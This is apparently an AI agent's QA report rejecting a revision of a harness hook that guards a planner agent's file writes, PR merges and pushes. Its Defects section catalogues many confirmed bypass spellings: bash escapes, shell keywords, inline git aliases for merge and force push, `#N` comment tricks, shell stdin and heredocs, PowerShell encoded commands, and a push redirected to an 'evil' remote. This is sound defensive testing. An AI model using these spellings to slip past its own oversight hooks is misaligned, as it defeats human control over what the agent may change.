# QA 237: T-194 r5 (the planner seat hook), scored by property

**Verdict: REJECT.** None of the four properties holds against spellings outside Forge's generator. Every class below
was confirmed in a real shell (Git Bash, Windows PowerShell 5.1, git), not only against my oracle.

- **P1:** shell keywords, unlisted wrappers, bash backslash quote-removal, `\` line continuations, `cp -t` clusters,
  `/dev/..`, `env --chdir` and code fed to a shell on stdin all reach a protected file and are allowed.
- **P2:** `gh pr merge #2` is read as PR 2. Bash and PowerShell both drop `#2` as a comment, so gh merges the current
  branch's PR. A foreign pull URL is read from that other repository and allowed. `m\erge`, `$'merge'`, `{merge,}`,
  `$X` and a `\`-newline put `merge` past the check with no read at all.
- **P2b:** an inline `git -c alias.m=merge m …` alias runs `merge`, `tag` or a force push with no grant. So do
  `mer\ge`, `{merge,}` and `pu\sh --force`.
- **P3:** 18 probed PowerShell spellings (plus 83 generated cases) write a protected file and are allowed. They include common parameters that take
  a value (`-EA 0`, `-OutVariable o`), `-Type`, splatting, `( … )` targets, `FileSystem::` paths, quoted comma lists,
  `-EncodedCommand`, `[scriptblock]::Create` and `[IO.File]::WriteAllText`.
- **R5-limit:** four items are stated only in the handoff, not in `BASH_WRITE_LIMIT`.

What r5 does well, it does fully:

- All 50 of Forge's mutants are red and typecheck.
- 431 planner-hook tests pass locally, and CI is green on Linux for both the candidate and the base.
- The r4 test files are unchanged.
- No QA 233/234/235 row regresses.
- The non-literal rule (80 of 80), the file tools (54 of 54), the standing-push grammar and the exact grant (16 of 16)
  hold under my generators.

**This is a RE-RUN.** The first QA 237 attempt died at the usage limit at 09:37Z, with no report and no push. I
reused its trees (`qa237-wt` at the dispatch SHA; `qa237-cand` and `qa237-mut` checked clean at `7a3a4441`) and its
helper scripts. I re-read the scripts and treated every output it left as unverified. **Everything cited here was
re-run in this session**: the build, the suite, every probe and generator, all 56 mutants, the real-shell checks, and
both CI runs (first pushed in this session). I fixed two of the first attempt's errors: an `-LP` probe row whose
expectation was wrong (PowerShell 5.1 has no `-LP` alias, so nothing is written), and a QA mutant that did not
typecheck.

- **QA:** 237, record session 237. Claude Code on **Opus 5.5 (`claude-opus-5-5`)**, headless `claude -p`, laptop
  DESKTOP-0GV3HAD (D-068).
- **Dispatch commit (working copy):** `efd9cf15ab2c351524c25c8209758b9182f51e7d`
  (`git -C C:/qa-scratch/qa237-wt log -1 --format=%H`).
- **Candidate:** `7a3a444135aa9f3049c40f17f8519421ccb4458b` on `origin/loop/t194-planner-hook`. The product is
  `8bd1541d`. **Base for red:** `d37e09dc4bd38cec0306e542773c3ab881602d6e`.
- **Evidence:** `docs/loops/t194-r5-qa-report.E_t.json`. `node build/harness/cli.js validate evidence <file>`, run in
  the candidate build, exits **0**. Scripts and raw outputs are in `docs/loops/qa-237/`, and all
  probes drive the **real built CLI** (`build/cli-planner-hook.js`) with fixture stdin. The hook is registered nowhere.
  No live GitHub call was made: the CLI runs with no token, and the async rows use a fake fetch.

## Build, suite, CI

| Step | Result |
|---|---|
| `npm ci && npm run build && npx tsc --noEmit` (candidate, TEMP/TMP=`C:\qa-tmp`) | **exit 0**, `build stamped 7a3a444` |
| `vitest run tests/planner-hook` (candidate) | **exit 0, 6 files, 431 passed** |
| r5 tests against the r4 product (`git checkout d37e09dc -- open-brain/src/planner-hook`) | **exit 1, 147 failed / 155 passed (302)**. The handoff's 141/296 predates the rows added later. Restored afterwards. |
| `git diff d37e09dc 7a3a4441 -- hook.test.ts docs-merge.test.ts r3.test.ts r4.test.ts` | **empty**: the r4 test files are unchanged |
| tcm CI, candidate: `qa/t194-r5-ci-candidate` | run **36857667379**, headSha `7a3a444135aa9f3049c40f17f8519421ccb4458b`, run **success**; `test` job 110353999146 **success** on **tcm-2, Linux x64**: 142 files, 2362 passed, 8 skipped (2370). Planner-hook: 429 passed, 2 skipped (the two Windows-only rows). `test-windows` skipped. |
| tcm CI, base: `qa/t194-r5-ci-base` | run **36857695715**, headSha `d37e09dc4bd38cec0306e542773c3ab881602d6e`, run **success**; `test` job 110354076639 **success** on **tcm-1, Linux x64**: 140 files, 2061 passed, 7 skipped (2068). |

I dispatched 2 tcm runs, both by push, never with `windows=true`. **The POSIX branch of the oracle ran on Linux and
passed** in r5's own tests, the half Forge could not run.

## Rows

| Row | Status | Evidence (summary; details under "Defects") |
|---|---|---|
| **R5-P1, "if" half** (a literal write landing under a protected path is denied) | **not met** | `gen-p1.mjs`, 400 cases: 33 fail-open, and **32 confirmed in real Git Bash** (`truth-check.mjs` → `truth-p1-cand.json`). The one exception is a `zz/..` detour where `zz/` does not exist, so the real `mv` fails. `probe-holes.mjs` and `probe-holes2.mjs` add 21 more fail-open spellings, all confirmed (`shell-truth-out.json`, `probe-holes2-cand.json`). D1–D6. |
| **R5-P1, "only if" half** (outside, no `cd` ⇒ allowed) | **not met** | 128 generated allow-cases: 1 denied with no named cause. A `#` comment is read as tee targets, and from cwd `open-brain/src` the word `done` lands in src. Probes add a commented-out write (`echo x # > open-brain/src/x.ts`, which writes nothing) and an unquoted `open-brain\src\x.ts` (bash writes `open-brainsrcx.ts` in the root). Both are denied as PH-1 with no stated cause. D7. |
| **R5-P1, non-literal** | **met** | 80 of 80 generated (`~`, `~user`, `$`, `${}`, `$( )`, backtick, `* ? [`, `{ }`, `$TMPDIR`, in 8 contexts) are refused with a named cause. The file tools: 54 of 54 agree with the oracle. |
| **R5-P2, gh merge grammar** | **not met** | `gen-p2.mjs`, 380 cases (260 merges, 120 non-merges): 54 disagree. **9 fail-open**: 5 foreign pull URLs and 4 `#N` comment refs. 45 fail-closed: 38 non-merges swept in, 7 exact merges with a trailing comment. `probe-merge-async.mjs` (fake fetch, every PR docs-only) shows `#2` and `…/other/repo/pull/3` **allowed**, the latter fetched from `other/repo`. `probe-holes2.mjs`: six rewrites of `pr`/`merge` are allowed with no read, and real bash hands gh `["pr","merge","2"]` each time. D8–D10. |
| **R5-P2b, git (ruling 2)** | **not met** | `gen-p2b.mjs`, 316 cases (300 + 16 grant): **9 fail-open, all inline `-c alias.…`** (real git ran the merge: master tip moved to `on feature`). 6 fail-closed, all a trailing `#` comment. Grant exactness: 16 of 16. `probe-holes2.mjs`: `git mer\ge`, `git {merge,}`, `git \⏎merge` and `git pu\sh --force origin master` are allowed, and real bash runs `merge` / `push --force`. D11, D12. |
| **R5-P3, PowerShell** | **not met** | The matcher is `Edit\|Write\|NotebookEdit\|Bash\|PowerShell` (`registration.ts:13`), and PowerShell `& gh` and `.\gh.exe` are read (met). `gen-p3.mjs`, 360 cases: **96 fail-open, 83 confirmed in real PowerShell 5.1** (`truth-p3-cand.json`). The other 13 are my oracle's errors (`-LP` is not an alias in 5.1; `-Pa` is ambiguous) or setup artefacts. `probe-holes.mjs` and `probe-holes2.mjs` add 18 more, all confirmed. D13–D16. |
| **R5-limit** | **not met** | Four "Out of reach" items are in the handoff only: `perl -pi`, `awk -i`, a `bash -c` nested more than four levels (confirmed written at depth 5 and allowed), and `Rename-Item`'s second argument. In the other direction, the text calls `rm` out of reach for "Bash and PowerShell", but PowerShell `rm` is caught. Several classes are neither caught nor stated (D17). |
| **Regression** (QA 233/234/235 probes re-run) | **met** | No regressions. Every changed result is a fixed defect, a QA recommendation, or covered by a ruling or "Supersedes" (table below). |
| **Mutants** | **met for Forge's 50; two test gaps from mine** | Forge's 50 in one sequential pass: **50 killed, 50 typecheck**. My 6: 4 killed by Forge's tests. `qa-p1-install-ignored` and `qa-p3-comma-list-off` **survive Forge's 431 tests**; my generator and `probe-comma.mjs` kill them. |

## Defects (each confirmed in the real shell; "QA file" names the row's evidence)

Each defect below is a property break by a spelling nobody listed, not a failed listed row.

**P1, the "if" half (the write lands in a protected path and the hook allows it):**

- **D1, the writer is out of command position.** `commandIndex` skips only `NAME=` and a fixed wrapper list, and it
  skips a wrapper's `-x` words but not their values. These are allowed:
  - `if true; then cp a.ts open-brain/src/x.ts; fi`, and the same through `do`, `!` and `{ … }`;
  - `timeout 5 cp …` (`timeout` is not a wrapper);
  - `nice -n 5 cp …` and `env -u FOO cp …` (the value is taken as the command);
  - `find . -exec cp {} open-brain/src/x.ts \;`.

  Generator classes: `ctx:new:bang` 9, `for-do` 6, `if-then` 4, `brace-group` 4, `timeout` 4, `time` 1. A redirect on
  the same simple command is still caught. Only the `tee`/`cp`/`mv`/`sed`/`install` targets are lost.
- **D2, bash quote removal.** `readWord` drops a backslash only before `space " ' $ \` and backtick. Bash drops it
  before any ordinary character, and `\⏎` is a line continuation.
  - These are allowed: `echo x > open-brain/s\rc/x.ts`, `cp a.ts open\-brain/src/x.ts`, and `{ echo x >| \planner-hook/run.ts; }`
    from cwd `open-brain/src` (the hook reads an absolute `/planner-hook/…`).
  - So are `echo x > open-brain/sr\⏎c/cli.ts` and `cp a.ts \⏎open-brain/src/x.ts`.
  - Generator classes: `spell:bs-escape` 8, `spell:bs-newline` 8.
- **D3, `cp`/`install` `-t` spellings.** `cp -topen-brain/src a.ts`, `cp -vt open-brain/src a.ts` and
  `cp --target open-brain/src a.ts` (GNU prefix) are allowed. Only the exact `-t` and `--target-directory[=]` are read.
- **D4, null sink tested before normalising.** `echo x > /dev/../c/<repo>/open-brain/src/x.ts` is allowed:
  `isNullSink` accepts any `/dev/` prefix.
- **D5, a directory change that is not `cd`.** `env --chdir=open-brain/src cp ../../a.ts x.ts` and
  `… | env -C open-brain/src tee x.ts` are allowed and write `open-brain/src/x.ts`. P1 refuses a same-line `cd`,
  `pushd` or `Set-Location`, and `env -C` is the same act.
- **D6, code given to a shell other than by `-c`.** These are allowed:
  - `bash <<'EOF'⏎echo x > open-brain/src/x.ts⏎EOF` (heredoc bodies are always data);
  - `echo 'echo x > open-brain/src/x.ts' | sh`;
  - `sed -n 'w open-brain/src/x.ts' a.txt` (sed's `w` command, no `-i`);
  - `echo hi # <<EOF⏎cp a.ts open-brain/src/x.ts⏎EOF`. There is no comment handling, so a `<<` inside a comment opens a
    fake heredoc that swallows the real write.

  None of these is in `BASH_WRITE_LIMIT`.

**P1, the "only if" half:**

- **D7, comments are read as words** (fail-closed, no named cause). Three cases:
  - `echo x # > open-brain/src/x.ts` writes nothing and is denied as a PH-1 write.
  - `… | tee C:/…/PRD.md # done` from cwd `open-brain/src` is denied because `done` resolves into src.
  - Unquoted `echo x > open-brain\src\x.ts` is denied as PH-1. Bash writes `open-brainsrcx.ts` in the root, so D2
    also runs in this direction.

**P2:**

- **D8, `#N` is a comment.** `gh pr merge #2` (bash and PowerShell): `parsePrRef` accepts `#2` and reads PR 2. The
  shell drops `#2`, and gh receives `pr merge` (verified argv `[gh][pr][merge]` and `pr|merge`), which **merges the
  current branch's PR**. With a docs-only PR 2 it is **allowed** (`probe-merge-async-cand.json`). A quoted `'#7'` is
  fine.
- **D9, a foreign pull URL.** `gh pr merge https://github.com/other/repo/pull/3` is read from `other/repo` and, if that
  PR is docs-only, **allowed**. The r5 grammar is `<N | origin pull URL>`, and the same merge spelled `--repo other/repo 3`
  is refused.
- **D10, shell rewrites of `pr`/`merge`.** `mergeAfterGh` treats a substituted word as a possible `gh` but compares
  `pr` and `merge` as literal text. These are **allowed with no read and no grant**, and gh receives exactly
  `pr merge 2`:
  - `gh pr m\erge 2`
  - `gh pr \⏎merge 2`
  - `gh pr $'merge' 2`
  - `gh pr {merge,} 2`
  - `X=merge; gh pr $X 2`
  - `gh $(echo pr) merge 2`

  An inline `gh alias set mm 'pr merge' && gh mm 2` is also allowed.
- **Non-merge swept in** (fail-closed; for the planner). Any gh command with `pr` and later the word `merge` needs a
  grant: `gh pr comment 5 --body merge`, `gh pr list --label merge`, `gh pr edit 5 --title merge`,
  `gh pr review 5 --comment -b merge`. That is 38 of 120 generated non-merges. This follows the r5 dispatch's literal
  token rule ("the tokens after that gh token contain `pr` and then `merge`") but contradicts its headline ("a merge if
  gh would run `pr merge`"), which QA 237's dispatch asks me to check. I do not count it toward the REJECT.

**P2b:**

- **D11, inline aliases.** `git -c alias.m=merge m feature`, `git -c alias.t=tag t v9` and
  `git -c alias.fp='push --force origin master' fp` are allowed. The global `-c` is skipped and the alias name is not a
  restricted subcommand. Real git merged.
- **D12, subcommand rewrites.** `git mer\ge feature`, `git {merge,} feature`, `git \⏎merge feature` and
  `git pu\sh --force origin master` are allowed (D2's tokeniser gap again). P2b does treat a `$`-substituted subcommand
  as restricted.
- **Observation, not scored:** `git -c remote.origin.url=https://github.com/evil/x push origin loop/x` is standing
  under ruling 2's text (the remote is `origin`) but pushes elsewhere. For the planner.

**P3 (every row writes in real PowerShell 5.1 and is allowed):**

- **D13, parameters the hook does not know.** A value-taking parameter outside `PS_VALUE_PARAMS` leaves its value as
  the first positional, and that value is taken as the path. This covers the common parameters `-EA`/`-ErrorAction`,
  `-WA`, `-OutVariable`/`-OV`, `-ErrorVariable`/`-EV`, `-OutBuffer`/`-OB`, `-InformationAction`/`-InfA` and
  `-PipelineVariable`/`-PV`. For example, `Set-Content -EA SilentlyContinue open-brain/src/x.ts x`. The parameter
  alias `New-Item -Type File open-brain/src/x.ts` is also missed.
- **D14, targets that are not a literal word.** Each of these is allowed, and P3 says it should be refused with a named
  cause:
  - `Set-Content -Path (Join-Path open-brain src/x.ts) -Value x` and `-Path ('open-brain/src/x.ts')`;
  - the splats `$a = 'open-brain/src/x.ts','x'; Set-Content @a` and `… Set-Content @h`;
  - a quoted comma list, `-Path 'C:/qa-tmp/y.txt','open-brain/src/x.ts'` (only an unquoted list is split).
- **D15, paths the canonicaliser misreads.** These are allowed:
  - `Set-Content FileSystem::C:\…\open-brain\src\x.ts x` and `Microsoft.PowerShell.Core\FileSystem::…`. The NTFS
    stream rule strips `::…`.
  - The drive-relative `Set-Content C:open-brain/src/x.ts x`.
- **D16, dynamic code not refused.** These are allowed:
  - `<##> Set-Content …` (a block comment);
  - `[scriptblock]::Create('Set-Content …').Invoke()`;
  - `powershell Set-Content …` (positional command), `powershell -EncodedCommand …` and `powershell -Comman "…"` (only
    `-c`, `-com`, `-comm` and `-command` are read);
  - `[IO.File]::WriteAllText(…)`;
  - a script block using an alias, `if ($true) { sc … }`, `{ ni … }` or `{ copy … }`. `PS_WRITE_WORD_RE` lists only the
    full cmdlet names.

**Limit text:**

- **D17.** `BASH_WRITE_LIMIT` omits four of the handoff's "Out of reach" items: `perl -pi`, `awk -i`, nesting deeper
  than four, and `Rename-Item`'s second argument. It calls `rm` out of reach for both shells, though PowerShell `rm`
  is caught. It is also silent on the D6 and D16 classes and on other writing cmdlets (`Get-Date | Export-Csv -Path
  open-brain/src/x.ts` writes and is allowed). This last part is a lesser point, since the dispatch lists the cmdlets.

## Earlier QA probes, re-run against the candidate

The scripts and recorded outputs were taken from origin and are byte-identical (`earlier-probes/verify-copies.mjs`).
They ran unmodified, with only the fixture paths re-pointed to `qa237-*` (`rerun.mjs`). The diff is in
`earlier-probes/compare-cand2.txt`. QA 233: 8 same, 8 differ. QA 234: 74 same, 17 differ. QA 234b: 3 same. QA 235: 80
same, 11 differ.

| Changed rows | Then → now | Class |
|---|---|---|
| QA233 P3, P4 (docs merge chained with a force push / code merge) | allow → deny | QA 233 defect fixed (r3) |
| QA233 P6 (`assignments.json` PR) | deny → allow | QA 233's "expected miss"; added to the allowlist on its recommendation |
| QA233 P9–P11, P13, P15 (absolute paths) | allow → deny | QA 233 D1 fixed |
| QA234 Q2 and O3 (outside the repo: sibling, climb-out, `/tmp`, scratch log) | deny → allow | superseded by r4's outside-allowed (scored met by QA 235) |
| QA234 Q4 (cwd-relative) and Q5 (case) | allow → deny | QA 234 defects fixed (r4) |
| QA234 Q7, Q8 and O2 (grant prefix or near-match) | allow → deny, grant kept | superseded by r4-5's exact grant |
| QA234 O1 (`gh.exe`, `"gh"`) | allow → deny (read; no token) | QA 234 defect fixed (r4) |
| QA235 LIMIT `cd … && echo x > src/cli.ts`, `(cd …; …)` | allow → deny | ruling 1 / "Supersedes" |
| QA235 r4-2 TILDE (3 rows; the keys changed with the fixture path) | allow → deny | QA 235 D4 fixed ("Supersedes") |
| QA235 r4-6 EXTRA `GH`, `gh.EXE`, `gh -R x pr merge` | allow → deny | QA 235 D5 fixed ("Supersedes") |

There are **no regressions**. Every row QA 235 scored met is among the 80 unchanged.

## Mutants

All runs were local, sequential, in `C:/qa-scratch/qa237-mut` at the candidate. Each mutant ran `git apply`, then
`tsc --noEmit`, then `vitest run tests/planner-hook`, then a restore. The single pass was split into batches by slice
only because one tool call is capped at 10 minutes (`run-mutants.mjs --slice`).

- **Forge's 50** (`mutants-forge-out.json`): **50 killed, 50 typecheck.** In Forge's run 1, the one that failed to
  typecheck was **`p3-powershell-tool-ignored`** (`typecheckExit: 2` in `results-run1.json`; fixed in `e96a289c`). It
  now typechecks and is killed (58 failed).
- **Mine** (`mutants/qa-*.diff`, `mutants-qa-out.json`). Each one is also built and run through my generator for its
  property:

| Mutant | Clause | Forge's tests | QA 237 evidence |
|---|---|---|---|
| `qa-p1-outside-refused` | P1 "only if": outside is allowed | killed (4) | gen-p1 366 → 315 |
| `qa-p1-install-ignored` | P1: `install` is a writer (the limit text names it) | **SURVIVED (431 pass)** | gen-p1 366 → 352, killed |
| `qa-p2-one-unchecked-word` | P2 exact grammar: every word after the ref is checked | killed (5) | gen-p2 326 → 322 |
| `qa-p2b-prune-allowed` | P2b: `--prune` needs a grant | killed (2) | gen-p2b 301 → 299 |
| `qa-p3-colon-inline-off` | P3: `-Path:value` | killed (1) | gen-p3 264 → 237 |
| `qa-p3-comma-list-off` | P3: an unquoted comma list is several targets | **SURVIVED (431 pass)** | gen-p3 does not reach it; `probe-comma.mjs`: candidate deny ×2, mutant allow ×2, killed |

The two survivors are test gaps: the handoff claims `install` and comma lists, and no test pins either one.

## Fail-closed cost (`fail-closed.mjs` → `fail-closed-cand.json`)

Each refusal below names a stated cause (`cd`, non-literal or 8.3), as P1 allows:

- `cd docs && npm test > C:/qa-tmp/out.txt`, and `cd open-brain && npx vitest run 2>&1 | tee C:/qa-tmp/vt.log`, are
  refused with "the command line changes directory with cd, pushd or Set-Location and also writes, so where the write
  lands cannot be determined; split them into two commands". PowerShell's `Set-Location docs; … > C:/qa-tmp/ls.txt` is
  refused the same way.
- `echo x > $TMPDIR/x` and `Set-Content $env:TEMP/x.txt x` are refused with "contains a shell expansion".
- `echo x > ~/notes.txt` is refused with "starts with ~".
- `"C:/qa-tmp/a (1).txt"` and `"C:/Program Files (x86)/x/a.txt"` are refused with "contains a parenthesis (process
  substitution or subshell)".
- `{a}` is refused as "brace expansion".
- `a[1].txt` is refused as "glob pattern", from Bash, from `Set-Content -LiteralPath`, and from the Write tool.
- `C:/PROGRA~1/x.txt` is refused as "8.3 short name".
- `1..2 | ForEach-Object { "x" | Out-File C:/qa-tmp/o$_.txt }` is refused as "a script block that writes".

These refusals name **no** stated cause. Each is a defect in the "only if" half of P1, or outside P2/P2b's scope:

- the commented-out write and the unquoted `open-brain\src\x.ts` (D7);
- `gh pr comment 5 --body merge` and `gh pr list --label merge` (non-merge swept in);
- `git push origin loop/x # push the slice` (a standing push with a trailing comment).

The controls `cd docs && ls` and `cd docs && ls > /dev/null` are allowed.

## Generators (required evidence 1)

Each generator is my own and was written from the property text. None imports Forge's generator, its oracle or the
hook's `paths.ts`. The P1 and P3 oracles are `path.win32.resolve(cwd, received)` plus my own protected-prefix regexes.
Each spelling is built from the intended path by the shell's quoting rules, so the oracle knows what the program
receives. The classes Forge's generator lacks are tagged `new:`:

- mixed quoting inside a word;
- `\`-escapes and `\⏎`;
- keyword, `!`, brace-group, `time`, `timeout` and `bash -c` contexts;
- trailing comments;
- `#N` and foreign-URL refs, and words before and between `pr` and `merge`;
- inline `-c` aliases and git global options;
- PowerShell common parameters, aliases, `-Param:value`, `( … )` targets, splatting and `if` blocks.

| Generator | Cases | Disagreements | Fail-open (confirmed in real shell) |
|---|---|---|---|
| `gen-p1.mjs` | 400 (272 deny-expected incl. 80 non-literal, 128 allow-expected; 54 Edit/Write) | 34 | 33 (32 confirmed) |
| `gen-p2.mjs` | 380 (260 merges, 120 non-merges) | 54 | 9 (argv- and fetch-confirmed classes D8, D9) |
| `gen-p2b.mjs` | 316 (300 + 16 grant-exactness) | 15 | 9 (real git ran the alias) |
| `gen-p3.mjs` | 360 (300 cmdlet spellings + 60 dynamic) | 96 | 96 (83 confirmed) |

Every disagreement is listed in the corresponding `gen-p*-cand.json`, under `disagreements`.

## Open for the planner

1. **The REJECT rests on D1–D6 and D8–D16.** Most share two roots. The first is the tokeniser: no bash quote removal
   for `\x`, no `\⏎`, no comments, and no shell keywords. The second is that `pr`, `merge`, `push` and the
   subcommand are compared as literal text after a word the shell rewrites. A fix by class would be:
   - in bash, read `\x` as `x` and `\⏎` as nothing, and treat `#` at word start as a comment;
   - treat any expanding or brace word in the gh/git subcommand positions as a possible restricted word;
   - skip reserved words and `!`, and take a wrapper's value-taking options into account;
   - refuse a heredoc or stdin fed to a shell;
   - in PowerShell, refuse any unknown parameter, splat, `( … )` or provider path rather than guess.
2. **D8 `#N`:** the hook should treat `#` as a comment, or refuse an unquoted `#N` ref. Quoted `'#N'` is fine.
3. **D9:** should a foreign pull URL need a grant, as the grammar `<N | origin pull URL>` says? I scored it so.
4. **Non-merge swept in:** the r5 token rule and its headline disagree. A ruling is needed on whether
   `gh pr comment 5 --body merge` may need a grant.
5. **P2b `-c remote.origin.url=` and `-c alias.*`:** ruling 2 speaks of "origin" and the subcommand. Does a `-c` that
   redefines either count as a substituted argument? I scored the aliases (D11) as fail-open, because git runs `merge`.
   I did not score `remote.origin.url`.
6. Nothing blocked this run. CI used 2 of the 4 runs.

QA-237: REPORT COMPLETE
